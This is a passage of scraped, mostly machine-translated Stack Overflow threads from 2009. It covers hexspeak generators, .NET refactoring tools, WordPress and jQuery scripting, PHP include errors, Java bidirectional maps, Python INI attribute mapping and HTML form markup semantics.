当您查看记忆查看器时会突出一些东西，并且与它的内容模糊相关（删除的记忆，无人区，外套......）。

这让我开始思考——这些有生成器吗？类似于 l33t 名称生成器的东西，但仅限于十六进制数字（hexits？）。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-05-13T22:54:50.340

```
$ grep -i '^[abcdefols]*$' /usr/share/dict/words | tr ols 015
abaca
abed
abe1e
ab1
ab1e
ab0de
ab0ded
acc
accede
acceded
.
.
.

0ff
0ffa1
0ffed
0ff10ad
0ff10aded
01de
01e0 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-13T22:17:07.593

**BAA5H33P** ??

它同时包含一个**H**和一个**P** ? 这些不是有效的十六进制数字。

你错过了 Java 著名的**[CAFEBABE](http://www.artima.com/insidejvm/whyCAFEBABE.html)**

您可以在[Wikipedia](http://en.wikipedia.org/wiki/Hexspeak)上阅读更多相关信息，包括：
**CAB1E**（电缆）
**FACE**
**BEAD**
**C0ED**
等......

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-13T22:39:20.160

啊哈！“Hexspeak”是 Google 需要的关键字。

这是一个查找所有 Hexspeak 单词的[Python 程序。](http://reminiscential.wordpress.com/2008/09/03/hexspeak-and-generator/)以及该程序发现的内容的[列表。](http://reminiscential.wordpress.com/2008/09/03/hexspeak-word-list/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-13T23:10:03.497

我今天的大脑很模糊，但这有效。换口味...

```
#!/usr/local/bin/python
letters = {'A':'A', 'B':'B', 'C':'C', 'D':'D', 'E':'E', 'F':'F', 'I':'1', 'O':'0', 'S':'5'}
f = open('/usr/share/dict/words', 'r')
for line in f:
    line = line[:-1]
    if len(line) < 4:
        continue
    word = ""
    goodword = True
    for c in list(line):
        if c.upper() not in letters.keys():
            goodword = False
        else:
            word += letters[c.upper()]
    if goodword:
        print "%20s\t%s" % (line,word)
f.close() 
```

# .net - What refactoring tools do you use for .NET?

> ID：860690
> 
> 赞同：15
> 
> 时间：2009-05-13T22:13:39.407
> 
> 标签：.net, visual-studio, refactoring

Do you use any of the refactoring tools like DevExpress' Refactor Pro? Which tool do you use and why?

I'm looking for recommendations. Ideally I'd like open source tool that works with VB and C# inside VS2005 and VS2008\. If I had to narrow down my list of ideals, I would purchase something for VS2008\. Not sure on the language choice, probably VB for now.

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2009-05-13T22:14:15.817

I can't recommend [ReSharper](http://www.jetbrains.com/resharper/) highly enough. It's not free or open source though. Starts from $US199 for the personal edition that works with both C# and VB.NET

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2009-05-13T22:17:13.753

[CodeRush，Visual Studio 的 Xpress 版本是免费的](http://devexpress.com/Products/Visual_Studio_Add-in/CodeRushX/)

还有一系列网络[直播教程](http://devexpress.com/Products/Visual_Studio_Add-in/CodeRushX/quickstart.xml)可供使用

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-05-13T22:47:34.080

[Resharper](http://www.jetbrains.com/resharper/)的大勾号，不仅是具有即时错误检查的生产力助推器，而且还提供关于更清洁/更好的做事方式的即时建议，包括最新版本中的新命名约定建议。一个教的工具。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-05-13T22:17:54.767

如需 ReSharper 的替代品，请尝试[DevExpress Refactor！临](http://www.devexpress.com/Products/Visual_Studio_Add-in/Refactoring/)。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2010-11-22T04:51:49.380

Code Style Enforcer 是主要用于代码重构的插件之一。您下载并安装它也是一个免费软件。

# iphone - 你知道哪些高质量的 iPhone 视频资源？

> ID：860699
> 
> 赞同：0
> 
> 时间：2009-05-13T22:16:47.997
> 
> 标签：iphone, cocoa-touch, video, uikit

我将开始：

iTunes U：著名的斯坦福大学在线提供“iPhone 应用程序编程”课程。[http://itunes.stanford.edu/](http://itunes.stanford.edu/)

我想知道是否还有更多优质的视频资源可供了解。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T22:23:20.123

Pragmatic Bookshelf 有一个由 5 部分组成的系列，题为“编写您的第一个 iPhone 应用程序”： http: [//www.pragprog.com/screencasts/v-bdiphone/writing-your-first-iphone-application](http://www.pragprog.com/screencasts/v-bdiphone/writing-your-first-iphone-application)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-06-03T01:34:08.303

[http://theappleblog.com/2009/06/01/43-iphone-development-resources/](http://theappleblog.com/2009/06/01/43-iphone-development-resources/)有一个很棒的视频资源部分。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-14T21:10:44.913

当我刚开始时，[iPhone Development Central](http://www.iphonedevcentral.org/ "iPhone 开发中心") (iphonedevcentral.org) 对我很有帮助。

他们将**视频教程**分为三个部分：**初学者**、**中级**和**高级**。

# php - 通过 CURL 发布和获取

> ID：860701
> 
> 赞同：1
> 
> 时间：2009-05-13T22:16:56.640
> 
> 标签：php, url, post, curl, get

我正在尝试使用 cURL 将信息从表单和隐藏的电子邮件变量（来自 db）发送到 PHP 脚本。我的帖子项目正确移动，但我不确定是否也可以通过 url 发送变量 vai。（$_Get）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T22:20:37.353

一个标准的查询字符串应该可以工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T22:21:52.327

尝试从 $_REQUEST 中提取变量，如果我没记错的话，它基本上是 $_GET，然后被 $_POST 和 $_COOKIE 覆盖。

# jquery - 为什么我的 jQuery 脚本没有在 Wordpress 中触发？

> ID：860704
> 
> 赞同：0
> 
> 时间：2009-05-13T22:17:31.477
> 
> 标签：jquery, wordpress, autocomplete

我在没有使用任何 CMS 的演示页面上测试了以下脚本。该脚本位于 index.php 文件中，并且工作正常。

```
<form method="get" action="">
  <input id="label_search" type="text" value="" maxlength="40" name="inputText"/>
</form>

<script type="text/javascript">
  var options = {
      script:"includes/autosuggest.php?json=true&",
      varname:"input",
      minchars: 2,
      delay: 200,
      json:true,
      shownoresults:false,
      maxresults:15,
      timeout: 5000
  };

  var as_json = new bsn.AutoSuggest('inputText', options);
</script> 
```

现在我想在 Wordpress 模板文件中使用相同的代码。但什么都没有发生。似乎脚本根本没有触发。

我正在使用用户友好的 URL，并将自定义永久链接设置为 /%category%/%postname%。也许这有什么要说的？

我知道 bsn.AutoSuggest_2.1.3.js 正在运行，因为在页面加载时对文件执行“alert('hello')”测试。

有什么问题？

这是我的 WP 代码：

sl_startpage.php：

```
<?php
/*
Template Name: SL - Start page
*/ 
  get_header(); ?>
  <div id="myArea">
  <?php
    include_once('includes/storeLocator/sl_header.php');
  ?>
  </div>

<?php 
  get_footer(); 
?> 
```

这是 sl_header.php 中的（简化的）代码：

```
 <div id="sl-header">
    <form method="get" action="">
      <input id="label_search" type="text" value="" maxlength="40" name="product_search"/>
    </form>                   
  </div>

  <script type="text/javascript">
    var options = {
        script:"includes/autosuggest.php?json=true&",
        varname:"input",
        minchars: 2,
        delay: 200,
        json:true,
        shownoresults:false,
        maxresults:15,
        timeout: 5000
    };
    var as_json = new bsn.AutoSuggest('product_search', options);
  </script> 
```

有什么建议吗？

这是我使用的插件： [http ://www.brandspankingnew.net/archive/2007/02/ajax_auto_suggest_v2.html](http://www.brandspankingnew.net/archive/2007/02/ajax_auto_suggest_v2.html)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T22:23:05.070

```
includes/autosuggest.php?json=true& 
```

这是网址吧？我认为它最终会与您的模板生成的文件相关，因此如果 autosuggest.php 的 url 位于：

```
http://yourserver.com/includes/autosuggest.php 
```

..然后您使用模板为以下两个（虚构的）网址生成 html：

```
http://yourserver.com/frontpage/
http://yourserver.com/categories/anotherpage/ 
```

我很确定它会在这里寻找您的包括：

```
http://yourserver.com/frontpage/includes/autosuggest.php
http://yourserver.com/categories/anotherpage/includes/autosuggest.php 
```

..当您可能希望它查看时：

```
http://yourserver.com/includes/autosuggest.php 
```

..所以尝试在该 JSON 中的 url 前面添加一个“/”，看看是否可以纠正它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-14T08:56:32.107

好的！经过大约 20 小时的研究，我在[Ryan Pharis 的博客](http://ryanpharis.com/2008/10/ajax-for-wordpress-plugins-using-jquery/)中找到了答案。正如我所怀疑的，这是一个简单的解决方案。

Wordpress 正在使用“用户友好的 URL”。因此我的路径最终是这样的： [http ://www.mysite.com/includes/autosuggest.php?json=true&](http://www.mysite.com/includes/autosuggest.php?json=true&)

真正的路径是这样的： [http ://www.mysite.com/wp-content/themes/my_theme/includes/autosuggest.php?json=true&](http://www.mysite.com/wp-content/themes/my_theme/includes/autosuggest.php?json=true&)

我的脚本不能位于外部 .js 脚本中，因为我需要从 Wordpress 获取 URL。所以我这样做了：

```
<?php $site_url = bloginfo('template_url'); ?>

 <script type="text/javascript">
    var options = {
        script:"<?php echo $site_url; ?>includes/autosuggest.php?json=true&", 
```

现在我的剧本有效，我是一个快乐的露营者。

# ssl - 带有可导出私钥的 SSL 证书

> ID：860715
> 
> 赞同：1
> 
> 时间：2009-05-13T22:19:30.177
> 
> 标签：ssl, ssl-certificate, private-key

我从 completeSSL 获得了试用服务器证书，并计划使用它来签署我的 Azure 生产站点。事实证明，我需要一个带有可导出私钥的证书……而我的新试用证书不是这样。

有谁知道哪些 ssl 供应商出售带有可导出私钥的证书？

# coldfusion - CF8 的 CFFEED 怪癖？

> ID：860716
> 
> 赞同：0
> 
> 时间：2009-05-13T22:19:49.303
> 
> 标签：coldfusion, coldfusion-8, cffeed

使用 CF8 的 CFFEED 标签时应该注意什么？

哦，这里有一个清单...

*   [还有一篇关于 cffeed 和 columnMap 的文章：Raymond Camden 的 ColdFusion 博客](http://www.coldfusionjedi.com/index.cfm/2008/8/21/Yet-another-post-on-cffeed-and-columnMap)
*   还要别的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T22:21:13.093

```
// remove anything outside of explicit hex range (x20-x7F=standard chars,xA=carriage return,xD=line feed)    
reReplace(rssXml,"[^(!\x20-\x7F|\xA|\xD)]","","all") 
```

资料来源：[CFFEED - 你最后一次让我失望了。：Raymond Camden 的 ColdFusion 博客](http://www.coldfusionjedi.com/index.cfm/2008/8/29/CFFEED--You-have-failed-me-for-the-last-time)，在[Nicholas发表的评论中](http://nicksollecito.com/)

# class - 在 php 中包含文件的问题无论我是否包含该文件都会出错

> ID：860724
> 
> 赞同：0
> 
> 时间：2009-05-13T22:21:18.880
> 
> 标签：class, php

和

```
include('basemodel.php'); 
```

我明白了

> 致命错误：在第 2 行的 C:\xampp\htdocs\allsides\account\model.php 中找不到类“BaseModel”

没有

```
include('basemodel.php'); 
```

我明白了

> 致命错误：无法在第 2 行的 C:\xampp\htdocs\allsides\others\basemodel.php 中重新声明类 BaseModel

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-13T22:29:23.733

尝试：

需要一次（“basemodel.php”）；

===

编辑：等等——你还包括哪些其他文件？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T22:37:02.567

对我来说，错误正是它所说的！

如果将 C:\xampp\htdocs\allsides\others\basemodel.php 重命名为 C:\xampp\htdocs\allsides\others\basemodel1.php 会发生什么（包括类定义）

看起来您有两个具有相同类名的文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T23:31:33.553

不知何故，您有两个“BaseModel”类的声明。但由于这只发生在您包含文件时，我建议您更好地查看该特定文件。

也许 BaseModel 文件包含一些其他文件，这些文件又包含 BaseModel？或者，也许您实际上尝试在文件中两次声明 BaseModel 类？

注意：我建议您*始终*使用 include_once() 或 require_once() 而不是 include/require！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-14T00:43:06.480

APC（缓存引擎）有时会对我这样做。如果您正在使用它，请尝试清除操作码缓存：

```
apc_clear_cache("user"); // user cache
apc_clear_cache(); // system cache 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-14T01:27:43.993

永远，永远，永远使用 include 或 require。使用 include_once 或 require_once。这条规则有一些小例外。但在大多数情况下，如果您的代码说 include 或 require，请将其更改为 include_once 或 require_once。

（模板引擎和代码怪异中的类似代码和 eval 的变通方法有时需要非 _once 版本。但这不是你正在做的。）

# java - 使用单一数据结构的两种方式映射

> ID：860727
> 
> 赞同：4
> 
> 时间：2009-05-13T22:21:46.197
> 
> 标签：java, oop, jakarta-ee, uuid

我最近在工作中遇到了一些代码（重新创建为类似于我正在处理的代码）类似于下面的代码

有没有办法可以修改下面的代码以使用一个数据结构（考虑到性能）？

这是一些代码来说明我的意思：

```
public class ObjectMapper {

    private Map<UUID,Integer> uuidMap;
    private Map<Integer,UUID> indexMap;

    public ObjectMapper(){
        uuidMap = new HashMap<UUID,Integer>();
        indexMap = new HashMap<Integer,UUID>();
    }

    public void addMapping(int index, UUID uuid){
        uuidMap.put(uuid, index);
        indexMap.put(index, uuid);
    }

    .
    .
    .

    public Integer getIndexByUUID(UUID uuid){
        return uuidMap.get(uuid);
    }

    public UUID getUUIDByIndex(Integer index){
        return indexMap.get(index);
    }

} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-05-13T22:57:07.387

[此处](https://stackoverflow.com/questions/711618/java-collection-unique-key-and-unique-value)建议使用[Google Collections](http://code.google.com/p/google-collections/)中的 BiMap 来回答此问题

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-13T23:19:58.613

Apache 集合支持[BidiMap](http://commons.apache.org/collections/api-3.1/org/apache/commons/collections/BidiMap.html)接口和各种相当有效的实现。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-13T23:06:31.863

您可以使用一个`Map<Object,Object>`来完成两个映射。丑，当然。`ObjectMapper`性能应该大致相同，或者在您有很多映射值很少的情况下稍好一些。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-12-21T18:55:32.493

您可以使用Eclipse [Collections中的](https://www.eclipse.org/collections/)[BiMap](https://www.eclipse.org/collections/javadoc/8.1.0/org/eclipse/collections/api/bimap/BiMap.html)。

`BiMap`是一个允许用户从两个方向执行查找的地图。BiMap 中的键和值都是唯一的。

主要实现是`HashBiMap`.

**`inverse()`**

`BiMap.inverse()`返回一个视图，其中键类型和值类型的位置被交换。

```
MutableBiMap<Integer, String> biMap =
  HashBiMap.newWithKeysValues(1, "1", 2, "2", 3, "3");
MutableBiMap<String, Integer> inverse = biMap.inverse();
Assert.assertEquals("1", biMap.get(1));
Assert.assertEquals(1, inverse.get("1"));
Assert.assertTrue(inverse.containsKey("3"));
Assert.assertEquals(2, inverse.put("2", 4)); 
```

**`put()`**

`MutableBiMap.put()`行为类似于`Map.put()`在常规地图上，除了在添加重复值时抛出。

```
MutableBiMap<Integer, String> biMap = HashBiMap.newMap();
biMap.put(1, "1"); // behaves like a regular put()
biMap.put(1, "1"); // no effect
biMap.put(2, "1"); // throws IllegalArgumentException 
```

**`forcePut()`**

其行为类似于`MutableBiMap.put()`，但在将键值对放入映射之前，它会默默地删除具有相同值的映射条目。

```
MutableBiMap<Integer, String> biMap = HashBiMap.newMap();
biMap.forcePut(1, "1"); // behaves like a regular put()
biMap.forcePut(1, "1"); // no effect
biMap.forcePut(1, "2"); // replaces the [1,"1"] pair with [1, "2"]
biMap.put(2, "2"); // removes the [1, "2"] pair before putting
Assert.assertFalse(biMap.containsKey(1));
Assert.assertEquals(HashBiMap.newWithKeysValues(2, "1"), biMap); 
```

**注意：**我是 Eclipse 集合的提交者。

# web-services - 是否有类似于亚马逊 AWS 的可扩展电子邮件服务用于存储？

> ID：860736
> 
> 赞同：4
> 
> 时间：2009-05-13T22:24:03.337
> 
> 标签：web-services, email, scalability

是否有可扩展的电子邮件服务，您只需为发送的电子邮件付费。我在考虑亚马逊[AWS](http://aws.amazon.com/)之类的服务，但电子邮件除外。

我有一个发送电子邮件的 Web 应用程序，我希望电子邮件提供商根据需求进行扩展。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2011-02-09T11:19:18.253

查看新的：[亚马逊电子邮件服务](http://aws.amazon.com/ses/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-13T22:37:43.097

谷歌应用引擎将是理想的。您也不必将整个应用程序移至它，只需创建一个 Web 服务，您可以将电子邮件注入其中并保护它，这样其他人就无法中继。它们不提供 smtp 或基于邮件的界面，但您可以在 google 的可扩展基础架构上运行它并获得丰厚的免费津贴，这样您就可以免费对其进行非常健壮的测试。

您必须创建一个连接到 Web 服务并批量触发电子邮件以绕过其 30 秒页面生命周期限制的客户端，但如果您创建了另一个用于上传实际电子邮件模板的 Web 服务，那么您需要发送的所有内容安排电子邮件时是一堆地址。最好使用少量数据反复轮询您的 Web 服务调用，就 google 而言，这是完全可以接受的行为。

他们将允许您每天发送 2000 封电子邮件，每分钟 8 封邮件，每日限额为 60MB - 在您收费之前。

如果您启用计费，这些限制将更改为每天**740 万个收件人，总正文大小上限为 29 GB，附件为 100 GB。**

[http://code.google.com/appengine/docs/quotas.html#Mail](http://code.google.com/appengine/docs/quotas.html#Mail)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T22:55:13.380

不幸的是，我用于完全相同目的的大多数 SMTP 服务对于固定数量的电子邮件都有固定的每月费用。

我发现最实惠的是[AuthSmtp](http://www.authsmtp.com)

# javascript - jQuery 从目录中拉取图片

> ID：860743
> 
> 赞同：11
> 
> 时间：2009-05-13T22:25:54.893
> 
> 标签：javascript, jquery, directory, image

是否可以从本地文件中提取一堆 .jpg 图片并将它们放入列表中？ *对不起，我很模糊*

从目录（相对于索引）中拉取。

我想按顺序在图像标签中列出它们。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-05-13T22:28:09.587

您可以使用以下内容动态创建图像并将其附加到列表中。

```
$('<img />')
    .attr('src', 'FOLDER LOCATION HERE')
    .appendTo('#mylist') 
```

一些快速搜索让我找到了一个 FileSystemObject ( ActiveX =( ) 来搜索文件夹中的文件。

这是一个链接： http: [//www.codeproject.com/KB/scripting/search_in_files.aspx](http://www.codeproject.com/KB/scripting/search_in_files.aspx)

但是，如果您正在执行任何服务器端处理（.net、php 等），这将是确定您可以在页面上显示哪些图像的最佳方式。（所以如果你能澄清一下）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T22:30:20.627

您是说您有一个包含图像位置的本地文本文件吗？

```
<?php
$handle = fopen("localfile.txt", 'r');

echo '<ul>';
while ($line = gets($handle)) {
    echo '<li><img src="' . $line . '"/></li>';
}
echo '</ul>';

fclose($handle);
?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T22:44:49.857

简短的回答：不，你不能。

长答案：您将需要使用 php 创建这些文件的列表，其代码类似于 Charles 发布的代码，然后将 AJAX 放入您的 jQuery 中。

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2011-08-20T09:07:44.660

使用 php 代码打印目录的所有图像：

```
<?php
$a=array();
if ($handle = opendir('.')) {
    while (false !== ($file = readdir($handle))) {
       if(preg_match("/\.png$/", $file)) 
            $a[]=$file;
    else if(preg_match("/\.jpg$/", $file)) 
            $a[]=$file;
    else if(preg_match("/\.jpeg$/", $file)) 
            $a[]=$file;

    }
    closedir($handle);
}

foreach($a as $i){
    echo "<img src='".$i."' />";
}
?> 
```

# python - 如何将 __setattr__ 和 __getattr__ 用于映射 INI 值？

> ID：860744
> 
> 赞同：4
> 
> 时间：2009-05-13T22:25:58.450
> 
> 标签：python, configuration-files

我想将 INI 文件映射为 python 对象。所以如果文件有：

```
[UserOptions]
SampleFile = sample.txt
SamplePort = 80
SampleInt = 1
Sample = Aja
SampleDate = 10/02/2008 
```

然后我想要：

```
c = Configuration('sample.ini')

c.UserOptions.SamplePort = 90 
```

我正在寻找**setattr**但我得到一个递归错误。

这就是我所拥有的：

```
class Configuration:
    def __init__ (self, fileName):
        cp = SafeConfigParser()
        cp.read(fileName)
        self.__parser = cp
        self.fileName = fileName

    def __getattr__ (self, name):
        if name in self.__parser.sections():
            return Section(name, self.__parser)
        else:
            return None

    def __str__ (self):
        p = self.__parser
        result = []
        result.append('<Configuration from %s>' % self.fileName)
        for s in p.sections():
            result.append('[%s]' % s)
            for o in p.options(s):
                result.append('%s=%s' % (o, p.get(s, o)))
        return '\n'.join(result)

class Section:
    def __init__ (self, name, parser):
        self.__name = name
        self.__parser = parser

    def __getattr__ (self, name):
        if self.__dict__.has_key(name):       # any normal attributes are handled normally
            return __getattr__(self, item)
        else:
            return self.__parser.get(self.name, name)

    def __setattr__(self, item, value):
        """Maps attributes to values.
        Only if we are initialised
        """
        if self.__dict__.has_key(item):       # any normal attributes are handled normally
            dict.__setattr__(self, item, value)
        else:
            self.__parser.set('UserOptions',item, value) 
```

现在我想知道为什么`self.__parser.set('UserOptions',item, value)`会出现错误。我阅读了 pythons 文档，但我不知道该怎么做。我怀疑我需要存储一个带有字段名称的字典并首先查看那里但是如何？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-13T23:04:38.153

您正在尝试按要求获取这些部分。但是迭代部分和选项并将它们作为属性添加到`__init__`. 我编辑了我的示例以支持 setattr 。你的问题在[这里](http://docs.python.org/reference/datamodel.html#object.__setattr__)解释你正在分配属性，`__setattr__`而你应该`__dict__`使用

```
from ConfigParser import  SafeConfigParser

class Section:
    def __init__(self, name, parser):
        self.__dict__['name'] = name
        self.__dict__['parser'] = parser

    def __setattr__(self, attr, value):
        self.__dict__[attr] = str(value)
        self.parser.set(self.name, attr, str(value))

class Configuration(object):
    def __init__(self, fileName):
        self.__parser = SafeConfigParser()
        self.__parser.read(fileName)
        self.fileName = fileName
        for section in self.__parser.sections():
            setattr(self, section, Section(section, self.__parser))
            for option in self.__parser.options(section):
                setattr(getattr(self, section), option,
                        self.__parser.get(section, option))

    def __getattr__(self, attr):
        self.__parser.add_section(attr)
        setattr(self, attr, Section(attr, self.__parser))
        return getattr(self, attr)

    def save(self):
        f = open(self.fileName, 'w')
        self.__parser.write(f)
        f.close()

c = Configuration('config.ini')

print dir(c) -> will print all sections
print dir(c.UserOptions) -> will print all user options
print c.UserOptions.sampledate

c.new.value = 10
c.save() 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-05-13T23:11:08.940

你的问题在`Section.__init__`. 当你设置`self.__name = name`它调用你的`__setattr__`方法时，没有找到关键`__dict__`所以它去

```
 self.__parser.set('UserOptions',item, value) 
```

所以现在它需要`self.__parser`.

哪个还没有设置。所以它试图让它使用`__getattr__`. 它发送它寻找`self.__parser`。哪个还没有设置。所以它试图让它使用`__getattr__`. 所以......你明白了:-)

避免这种情况的一种方法是`Section.__setattr__`像这样添加条件

```
if item.startswith('_') or self.__dict__.has_key(item):
   ^^^^^^^^^^^^^^^^^^^^^^^
   ... 
```

这将确保`__name`并`__parser`在初始化时正确设置。

# html - p 与 ol 或 ul 用于表单样式

> ID：860745
> 
> 赞同：18
> 
> 时间：2009-05-13T22:26:16.517
> 
> 标签：html, css, forms, semantics

通常，我使用无序列表标签为表单设置样式，例如

```
<fieldset>
    <ul>
        <li>
            <label for="txtName">Name</label>
            <input type="text" id="txtName" />
        </li>
    </ul>
</fieldset> 
```

但是，我经常看到使用`<p>`标签的标记，如下所示：

```
<fieldset>
    <p>
        <label for="txtName">Name</label>
        <input type="text" id="txtName" />
    </p>
</fieldset> 
```

以下哪个在语义上更正确？`<p>`除了风格更简洁之外，不同的方法有什么优点或缺点吗？

编辑：显然在这里打开一罐蠕虫 - 更多选择，嘎！:) W3C 这里有推荐吗？

有趣的是，W3C 的建议似乎是最不优雅的解决方案：

```
<p>
  <input type="radio" name="flavor" id="choc" value="chocolate" />
    <label for="choc">Chocolate</label><br/>
  <input type="radio" name="flavor" id="cream" value="cream"/>
    <label for="cream">Cream Filled</label><br/>
  <input type="radio" name="flavor" id="honey" value="honey"/>
    <label for="honey">Honey Glazed</label><br/>
  <input type="submit" value="Purchase Donuts"/>
</p> 
```

遗憾的是，没有关于标记表单元素的最佳约定的更强有力的指导。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2009-05-13T22:32:48.830

在我看来，一组表单控件既不是列表项也不是段落。`<div>`当我标记表单时，我通过将它们包装在s中来分隔我的标签/输入组。如果您试图标记表单控件之间的**分隔**，那么不要害怕使用`<div>`.

```
<fieldset>
  <div class="field">
    <label for="txtName">Name</label>
    <input type="text" id="txtName" />
  </div>
  <div class="field">
    <label for="txtTitle">Title</label>
    <input type="text" id="txtTitle" />
  </div>
</fieldset> 
```

从您给定的示例中，`<p>`可能会“更好”地降级，因为如果 CSS 不可用，您将看不到项目旁边的项目符号，并且控件组可能会很好地间隔开。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2009-05-13T22:30:54.933

不要忘记定义列表：

```
<fieldset>
    <dl>
        <dt><label for="txtName">Name</label></dt>
        <dd><input type="text" id="txtName" /></dd>
    </dl>
</fieldset> 
```

没有真正正确的答案。选择对您最有意义的标记。对我来说，表单不是无序列表。定义列表在我的脑海中更接近。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-05-13T22:49:31.627

一般来说，从语义上讲，表单字段既不是段落也不是列表项。如果您需要将表单字段分组在一起，则带有类的 s 可能最合适，但如果您只是在/对`<div>`周围寻找容器，请考虑将标签与字段相关联的[替代方法：](http://www.w3.org/TR/html401/interact/forms.html#adef-for)`<label>``<input>`

```
<fieldset>
    <label>Name <input type="text" id="txtName"/></label>
    <label>Location <input type="text" id="txtLocation"/></label>
</fieldset> 
```

然后，您可以在没有人工包装器的情况下一起设计或操作它们（并且不必再担心`for=`）。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2009-05-14T01:56:34.097

我倾向于使用有序列表

```
<fieldset>
<ol>
    <li>
        <label for="txtNameFirst">Name</label>
        <input type="text" id="txtNameFirst" />
    </li>
    <li>
        <label for="txtNameLast">Name</label>
        <input type="text" id="txtNameLast" />
    </li>
</ol>
</fieldset> 
```

我使用有序列表的语义推理是打印中的大量表单实际上是编号的，因此是表单输入的有序列表。

从语义上讲，我认为定义列表也是有效的，它确实具有为每个标签/输入配对以及每个单独的标签和输入提供包装器的额外好处，这可以为您提供很多设计控制（如果可以的话）忍受在每个标签/输入对周围包装 DL 的轻微粗暴）

```
<fieldset>
    <dl>
        <dt><label for="txtNameFirst">Name</label></dt>
        <dd><input type="text" id="txtNameFirst" /></dd>
    </dl>
    <dl>
        <dt><label for="txtNameLast">Name</label></dt>
        <dd><input type="text" id="txtNameLast" /></dd>
    </dl>
</fieldset> 
```

如果有序/无序/定义列表不适合您，那么我会选择 div。它们唯一隐含的语义是“一个部门”，所以它们很适合这项工作。

我很难证明使用段落 (p) 元素来包装标签/输入对是合理的，因为 p 元素的隐含语义在我看来并不适用。（此外，如果需要，最好将 p 元素保留在表单中以用于解释性文本）

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-05-13T23:04:15.660

W3C 为表单布局的关键是表单的设置方式可以很容易地以编程方式对标签和表单元素进行分组：

> [1.3.1 信息和关系：通过演示传达的信息、结构和关系可以通过程序确定或以文本形式提供。](http://www.w3.org/TR/UNDERSTANDING-WCAG20/content-structure-separation-programmatic.html)

特别是[HTML 技术 44：使用标签元素](http://www.w3.org/TR/2008/NOTE-WCAG20-TECHS-20081211/H44)和[HTML 技术 71：提供描述](http://www.w3.org/TR/2008/NOTE-WCAG20-TECHS-20081211/H71)。

将每个标签和输入包装在列表项中的好处是，使用屏幕阅读器的用户可能会在开始时得到一些指示，表明列表中有 x 项，这可能很有用。

一般来说，尽管我们的设计师与[Zack](https://stackoverflow.com/questions/860745/p-vs-ol-or-ul-for-form-styling/860763#860763)合作——我们的表单行被包裹在一个 div 中，并带有“formrow”类或类似的类。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-14T02:02:40.493

我倾向于使用一个`<div>`per`<label>`和`<input>`combo，直到我找到一份标准是无序列表的新工作。我有一位同事对表格发誓（一列用于标签，一列用于字段）声称它只是具有编辑功能的表格数据。

在这一点上，我认为输入作为无序列表是最好的语义匹配，但正如您所注意到的，关于这个主题有很多意见。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-06-19T11:53:42.457

WHATWG 实际上将表格的每个部分视为一个[段落](https://html.spec.whatwg.org/multipage/forms.html#writing-a-form's-user-interface)：

> 表单的每个部分都被视为一个段落，并且通常使用 p 元素与其他部分分开。

我不确定我是否同意这一点，但这似乎是你能得到的问题的最“官方”答案。遗憾的是我找不到任何解释。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-02-13T15:00:44.970

如果您的表单内容始终包含

```
<form id='theform'>
  <label for='item-1'>Name</label>
  <input id='item-1 type='text' name='name'>
  <label for='item-2'>Email</label>
  <input id='item-2 type='email' name='email'>
</form> 
```

可以用一个单一的样式来设置它

```
#theform  {
    display: grid;
    grid-template-columns: 100px 200px;
} 
```

产生一个 100px 宽的标签列和一个 200px 宽的输入字段列。但它需要标签/输入或标签/选择的节奏，中间没有任何内容。

# c# - ValidationAttribute Redux

> ID：860750
> 
> 赞同：0
> 
> 时间：2009-05-13T22:27:45.280
> 
> 标签：c#, linq-to-sql, validation, lambda

参考：[创建 ValidationAttribute 以确保唯一的列值。](https://stackoverflow.com/questions/859495/validationattribute-to-ensure-property-value-is-unique)

好的...让我们尝试重新构建问题：

从[这里](https://stackoverflow.com/questions/637672/linq-2-sql-generic-where-clause)我撕掉了这段代码：

```
 static TEntity Get<TEntity, TKey>(this DataContext ctx, TKey key) where TEntity : class
    {
        var table = ctx.GetTable<TEntity>();
        var pkProp = (from member in ctx.Mapping.GetMetaType(typeof(TEntity)).DataMembers
                      where member.IsPrimaryKey
                      select member.Member).Single();
        ParameterExpression param = Expression.Parameter(typeof(TEntity), "x");
